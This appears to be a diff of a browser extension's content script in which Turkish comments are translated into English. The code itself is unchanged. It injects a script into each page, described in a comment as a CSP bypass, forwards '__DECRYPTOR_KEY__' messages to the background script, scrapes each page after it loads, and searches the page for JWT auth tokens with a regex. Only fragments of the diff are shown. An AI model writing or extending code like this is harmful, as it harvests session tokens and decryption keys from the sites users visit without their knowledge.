@@ -1,16 +1,16 @@
-// content.js - inject.js'i sayfaya yükler ve mesajları background'a iletir
+// content.js - Injects inject.js into the page and forwards messages to background
 
-// 1. inject.js'i page context'ine yükle (extension URL = CSP bypass)
+// 1. Inject inject.js into page context (extension URL = CSP bypass)
 try {
     var s = document.createElement('script');
     s.src = chrome.runtime.getURL('inject.js');
     s.onload = function() { this.remove(); };
     (document.head || document.documentElement).appendChild(s);
 } catch(e) {
-    console.log("inject.js yükleme hatası:", e);
+    console.log("inject.js load error:", e);
 }
 
-// 2. Page'den gelen key mesajlarını background'a ilet
+// 2. Forward key messages from Page to background
 window.addEventListener("message", function(event) {
     if (event.data && event.data.type === "__DECRYPTOR_KEY__") {
         try {
@@ -23,7 +23,7 @@ window.addEventListener("message", function(event) {
     }
 });
 
-// 3. Sayfa tarama (DOMContentLoaded sonrası)
+// 3. Page scraping (after DOMContentLoaded)
 if (document.readyState === "complete" || document.readyState === "interactive") {
     setTimeout(scrapeEverything, 500);
 } else {
@@ -43,7 +43,7 @@ function scrapeEverything() {
         }
     } catch(e) {}
 
-    // Auth token ara
+    // Search for Auth token
     try {
         var tokens = {};
         var authRegex = /eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+/g;
